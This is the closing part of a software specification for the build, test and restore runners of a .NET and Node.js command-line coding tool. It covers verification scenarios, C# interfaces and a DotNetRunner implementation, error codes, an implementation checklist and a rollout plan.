| NodeRunner.cs | 85% |
| DotNetOutputParser.cs | 95% |
| NodeOutputParser.cs | 95% |
| RunnerResult.cs | 95% |
| Overall | 85% |

---

## User Verification Steps

### Scenario 1: Detect .NET Project

**Objective:** Verify .NET project detection works correctly

**Steps:**
1. Create a new .NET project: `dotnet new console -n TestApp`
2. Navigate to parent directory
3. Run `acode project detect`

**Expected Results:**
- Output shows "TestApp.csproj (dotnet)" detected
- Detection completes in under 100ms
- Project path is correct

### Scenario 2: Detect Node.js Project

**Objective:** Verify Node.js project detection works correctly

**Steps:**
1. Create a new Node project: `npm init -y`
2. Navigate to parent directory
3. Run `acode project detect`

**Expected Results:**
- Output shows "package.json (node)" detected
- Package manager (npm/yarn) correctly identified
- Detection completes in under 100ms

### Scenario 3: Build .NET Project

**Objective:** Verify .NET build operation works

**Steps:**
1. Create a .NET project with code
2. Run `acode build`
3. Observe output

**Expected Results:**
- Build command executes successfully
- Output shows "Build succeeded"
- DLL files created in bin directory
- Errors/warnings parsed and displayed if any

### Scenario 4: Build .NET with Configuration

**Objective:** Verify configuration flag works

**Steps:**
1. Run `acode build --configuration Release`
2. Check output directory

**Expected Results:**
- Build uses Release configuration
- Output in bin/Release directory
- Optimizations applied

### Scenario 5: Test .NET Project

**Objective:** Verify .NET test execution works

**Steps:**
1. Create a .NET test project with tests
2. Run `acode test`
3. Observe output

**Expected Results:**
- Tests execute via `dotnet test`
- Pass/fail/skip counts displayed
- Individual test names visible
- Failure details shown for failing tests

### Scenario 6: Build Node.js Project

**Objective:** Verify Node.js build operation works

**Steps:**
1. Create Node.js project with build script in package.json
2. Run `npm install` to install dependencies
3. Run `acode build`
4. Observe output

**Expected Results:**
- Build script executes via npm
- Output shows build progress
- Build artifacts created
- Errors parsed and displayed if any

### Scenario 7: Test Node.js Project with Jest

**Objective:** Verify Node.js test execution with Jest

**Steps:**
1. Create Node.js project with Jest tests
2. Configure test script in package.json
3. Run `acode test`
4. Observe output

**Expected Results:**
- Jest tests execute
- Pass/fail counts displayed
- Test suite names visible
- Failure details with stack traces shown

### Scenario 8: Detect Mixed Project

**Objective:** Verify detection of multiple project types

**Steps:**
1. Create directory with both .NET and Node.js projects
2. Run `acode project detect`
3. Observe output

**Expected Results:**
- Both project types detected
- Each project listed with correct type
- Projects prioritized correctly

### Scenario 9: Build with Missing SDK

**Objective:** Verify graceful handling of missing SDK

**Steps:**
1. Create a .NET project
2. Rename/hide dotnet CLI temporarily
3. Run `acode build`
4. Observe error message

**Expected Results:**
- Clear error: "dotnet SDK not found"
- Installation guidance provided
- No crash or stack trace

### Scenario 10: Restore Dependencies

**Objective:** Verify dependency restoration works

**Steps:**
1. Clone a project with dependencies
2. Delete node_modules or obj folders
3. Run `acode restore`
4. Observe output

**Expected Results:**
- Dependencies downloaded
- Package counts displayed
- Lock file updated if needed
- Errors shown for failed packages

---

## Implementation Prompt

### File Structure

```
src/AgenticCoder.Domain/
├── Runners/
│   ├── ILanguageRunner.cs           # Runner interface
│   ├── RunnerResult.cs              # Operation result
│   ├── RunnerError.cs               # Structured error
│   ├── RunnerWarning.cs             # Structured warning
│   ├── TestResults.cs               # Test execution results
│   ├── TestCase.cs                  # Individual test result
│   ├── ProjectInfo.cs               # Detected project info
│   ├── BuildOptions.cs              # Build operation options
│   ├── TestOptions.cs               # Test operation options
│   └── RunOptions.cs                # Run operation options
│
src/AgenticCoder.Application/
├── Runners/
│   ├── IRunnerRegistry.cs           # Registry interface
│   ├── IOutputParser.cs             # Output parser interface
│   └── RunnerOperations.cs          # Enum of supported operations
│
src/AgenticCoder.Infrastructure/
├── Runners/
│   ├── RunnerRegistry.cs            # Registry implementation
│   ├── DotNetRunner.cs              # .NET runner
│   ├── NodeRunner.cs                # Node.js runner
│   ├── OutputParsers/
│   │   ├── DotNetOutputParser.cs    # MSBuild/test parsing
│   │   ├── JestOutputParser.cs      # Jest test parsing
│   │   ├── MochaOutputParser.cs     # Mocha test parsing
│   │   └── NpmOutputParser.cs       # npm error parsing
│   └── Configuration/
│       ├── RunnerConfiguration.cs   # Config binding
│       └── DotNetConfiguration.cs   # .NET specific config
│
src/AgenticCoder.CLI/
├── Commands/
│   ├── ProjectDetectCommand.cs      # acode project detect
│   ├── BuildCommand.cs              # acode build
│   ├── TestCommand.cs               # acode test
│   ├── RunCommand.cs                # acode run
│   └── RestoreCommand.cs            # acode restore
│
Tests/Unit/Runners/
├── RunnerRegistryTests.cs
├── DotNetRunnerTests.cs
├── NodeRunnerTests.cs
├── DotNetOutputParserTests.cs
└── NodeOutputParserTests.cs
│
Tests/Integration/Runners/
├── DotNetRunnerIntegrationTests.cs
└── NodeRunnerIntegrationTests.cs
```

### ILanguageRunner Interface

```csharp
namespace AgenticCoder.Domain.Runners;

/// <summary>
/// Language-specific runner for build, test, and run operations.
/// </summary>
public interface ILanguageRunner : IDisposable
{
    /// <summary>
    /// Language identifier (e.g., "dotnet", "node").
    /// </summary>
    string Language { get; }
    
    /// <summary>
    /// File patterns for detection (e.g., "*.sln", "package.json").
    /// </summary>
    IReadOnlyList<string> FilePatterns { get; }
    
    /// <summary>
    /// Priority for ordering when multiple runners match.
    /// Higher values = higher priority.
    /// </summary>
    int Priority { get; }
    
    /// <summary>
    /// Whether the required SDK/runtime is available.
    /// </summary>
    bool IsAvailable { get; }
    
    /// <summary>
    /// Operations supported by this runner.
    /// </summary>
    RunnerOperations SupportedOperations { get; }
    
    /// <summary>
    /// Detects if this runner applies to the given path.
    /// </summary>
    Task<ProjectInfo?> DetectAsync(
        string path, 
        CancellationToken ct = default);
    
    /// <summary>
    /// Gets SDK/runtime version information.
    /// </summary>
    Task<string> GetVersionAsync(CancellationToken ct = default);
    
    /// <summary>
    /// Builds the project.
    /// </summary>
    Task<RunnerResult> BuildAsync(
        string path,
        BuildOptions? options = null,
        CancellationToken ct = default);
    
    /// <summary>
    /// Runs tests.
    /// </summary>
    Task<RunnerResult> TestAsync(
        string path,
        TestOptions? options = null,
        CancellationToken ct = default);
    
    /// <summary>
    /// Runs the application.
    /// </summary>
    Task<RunnerResult> RunAsync(
        string path,
        RunOptions? options = null,
        CancellationToken ct = default);
    
    /// <summary>
    /// Restores dependencies.
    /// </summary>
    Task<RunnerResult> RestoreAsync(
        string path,
        CancellationToken ct = default);
}

[Flags]
public enum RunnerOperations
{
    None = 0,
    Detect = 1,
    Build = 2,
    Test = 4,
    Run = 8,
    Restore = 16,
    All = Detect | Build | Test | Run | Restore
}
```

### RunnerResult Record

```csharp
namespace AgenticCoder.Domain.Runners;

/// <summary>
/// Result from a runner operation.
/// </summary>
public sealed record RunnerResult
{
    public required bool Success { get; init; }
    public required TimeSpan Duration { get; init; }
    public required string RawOutput { get; init; }
    public required Command ExecutedCommand { get; init; }
    public IReadOnlyList<RunnerError> Errors { get; init; } = [];
    public IReadOnlyList<RunnerWarning> Warnings { get; init; } = [];
    public TestResults? TestResults { get; init; }
    
    public static RunnerResult FromCommandResult(
        CommandResult cmdResult, 
        IReadOnlyList<RunnerError>? errors = null,
        IReadOnlyList<RunnerWarning>? warnings = null,
        TestResults? testResults = null)
    {
        return new RunnerResult
        {
            Success = cmdResult.Success && (errors?.Count ?? 0) == 0,
            Duration = cmdResult.Duration,
            RawOutput = cmdResult.Stdout + cmdResult.Stderr,
            ExecutedCommand = cmdResult.Command,
            Errors = errors ?? [],
            Warnings = warnings ?? [],
            TestResults = testResults
        };
    }
}

public sealed record RunnerError(
    string? File,
    int? Line,
    int? Column,
    string Code,
    string Message
);

public sealed record RunnerWarning(
    string? File,
    int? Line,
    int? Column,
    string Code,
    string Message
);

public sealed record TestResults
{
    public required int PassedCount { get; init; }
    public required int FailedCount { get; init; }
    public required int SkippedCount { get; init; }
    public int TotalCount => PassedCount + FailedCount + SkippedCount;
    public IReadOnlyList<TestCase> Tests { get; init; } = [];
}

public sealed record TestCase(
    string Name,
    TestStatus Status,
    TimeSpan Duration,
    string? FailureMessage = null,
    string? StackTrace = null
);

public enum TestStatus { Passed, Failed, Skipped }
```

### DotNetRunner Implementation

```csharp
namespace AgenticCoder.Infrastructure.Runners;

public sealed class DotNetRunner : ILanguageRunner
{
    private readonly ICommandExecutor _executor;
    private readonly DotNetOutputParser _parser;
    private readonly ILogger<DotNetRunner> _logger;
    
    public string Language => "dotnet";
    public IReadOnlyList<string> FilePatterns => ["*.sln", "*.csproj", "*.fsproj"];
    public int Priority => 100;
    public bool IsAvailable => CheckDotNetAvailable();
    public RunnerOperations SupportedOperations => RunnerOperations.All;
    
    public async Task<ProjectInfo?> DetectAsync(string path, CancellationToken ct)
    {
        // Prefer solution files
        var solutions = Directory.GetFiles(path, "*.sln", SearchOption.TopDirectoryOnly);
        if (solutions.Length > 0)
        {
            return new ProjectInfo
            {
                Language = "dotnet",
                Path = solutions[0],
                Type = "solution",
                Name = Path.GetFileNameWithoutExtension(solutions[0])
            };
        }
        
        // Fall back to project files
        var projects = Directory.GetFiles(path, "*.csproj", SearchOption.TopDirectoryOnly)
            .Concat(Directory.GetFiles(path, "*.fsproj", SearchOption.TopDirectoryOnly))
            .ToArray();
            
        if (projects.Length > 0)
        {
            return new ProjectInfo
            {
                Language = "dotnet",
                Path = projects[0],
                Type = "project",
                Name = Path.GetFileNameWithoutExtension(projects[0])
            };
        }
        
        return null;
    }
    
    public async Task<RunnerResult> BuildAsync(
        string path, 
        BuildOptions? options, 
        CancellationToken ct)
    {
        var command = Command.Create("dotnet")
            .WithArguments("build", path)
            .WithArguments("-c", options?.Configuration ?? "Debug")
            .WithArguments("-v", MapVerbosity(options?.Verbosity))
            .Build();
        
        if (options?.NoRestore == true)
        {
            command = command with { 
                Arguments = command.Arguments.Append("--no-restore").ToList() 
            };
        }
        
        var result = await _executor.ExecuteAsync(command, ct: ct);
        var (errors, warnings) = _parser.ParseBuildOutput(result.Stdout + result.Stderr);
        
        return RunnerResult.FromCommandResult(result, errors, warnings);
    }
    
    public async Task<RunnerResult> TestAsync(
        string path, 
        TestOptions? options, 
        CancellationToken ct)
    {
        var args = new List<string> { "test", path, "--logger", "trx" };
        
        if (!string.IsNullOrEmpty(options?.Filter))
        {
            args.AddRange(["--filter", options.Filter]);
        }
        
        var command = Command.Create("dotnet")
            .WithArguments(args.ToArray())
            .Build();
        
        var result = await _executor.ExecuteAsync(command, ct: ct);
        var testResults = _parser.ParseTestOutput(result.Stdout);
        var (errors, warnings) = _parser.ParseBuildOutput(result.Stderr);
        
        return RunnerResult.FromCommandResult(result, errors, warnings, testResults);
    }
    
    private static string MapVerbosity(string? verbosity) => verbosity?.ToLower() switch
    {
        "quiet" => "q",
        "minimal" => "m",
        "normal" => "n",
        "detailed" => "d",
        "diagnostic" => "diag",
        _ => "m"
    };
    
    private bool CheckDotNetAvailable()
    {
        try
        {
            var result = Process.Start(new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = "--version",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            });
            result?.WaitForExit(5000);
            return result?.ExitCode == 0;
        }
        catch
        {
            return false;
        }
    }
}
```

### Error Codes

| Code | Meaning | Resolution |
|------|---------|------------|
| ACODE-RUN-001 | Runner not found for path | Ensure project files exist and runner is enabled |
| ACODE-RUN-002 | SDK not found | Install required SDK and add to PATH |
| ACODE-RUN-003 | Build failed | Check error messages, fix code issues |
| ACODE-RUN-004 | Test failed | Check test failures, fix failing tests |
| ACODE-RUN-005 | Script not found | Add required script to package.json |
| ACODE-RUN-006 | Restore failed | Check network, registry access |
| ACODE-RUN-007 | Version mismatch | Install correct SDK version per global.json/.nvmrc |
| ACODE-RUN-008 | Parse error | Check output format, report if unexpected |

### Implementation Checklist

1. [ ] Create ILanguageRunner interface with all methods
2. [ ] Create RunnerResult, RunnerError, RunnerWarning records
3. [ ] Create TestResults and TestCase records
4. [ ] Create BuildOptions, TestOptions, RunOptions records
5. [ ] Create IRunnerRegistry interface
6. [ ] Implement RunnerRegistry with detection caching
7. [ ] Implement DotNetRunner with all operations
8. [ ] Implement DotNetOutputParser for MSBuild errors
9. [ ] Implement DotNetOutputParser for test results
10. [ ] Implement NodeRunner with all operations
11. [ ] Implement npm/yarn/pnpm detection
12. [ ] Implement JestOutputParser for Jest test output
13. [ ] Implement MochaOutputParser for Mocha test output
14. [ ] Implement NpmOutputParser for npm errors
15. [ ] Register runners in DI container
16. [ ] Create acode project detect CLI command
17. [ ] Create acode build CLI command
18. [ ] Create acode test CLI command
19. [ ] Create acode run CLI command
20. [ ] Create acode restore CLI command
21. [ ] Write unit tests for all components
22. [ ] Write integration tests with real SDKs
23. [ ] Write E2E tests for CLI commands
24. [ ] Create performance benchmarks
25. [ ] Document configuration options

### Rollout Plan

| Phase | Description | Duration | Success Criteria |
|-------|-------------|----------|------------------|
| 1 | Domain models | 2 days | All records defined, serializable |
| 2 | ILanguageRunner interface | 1 day | Interface complete, documented |
| 3 | Runner registry | 2 days | Registration, detection, caching work |
| 4 | .NET runner | 3 days | All operations work, errors parsed |
| 5 | Node.js runner | 3 days | All operations work, Jest/Mocha parsed |
| 6 | CLI commands | 2 days | All commands work, output formatted |
| 7 | Testing & docs | 3 days | 85%+ coverage, docs complete |

---

**End of Task 019 Specification**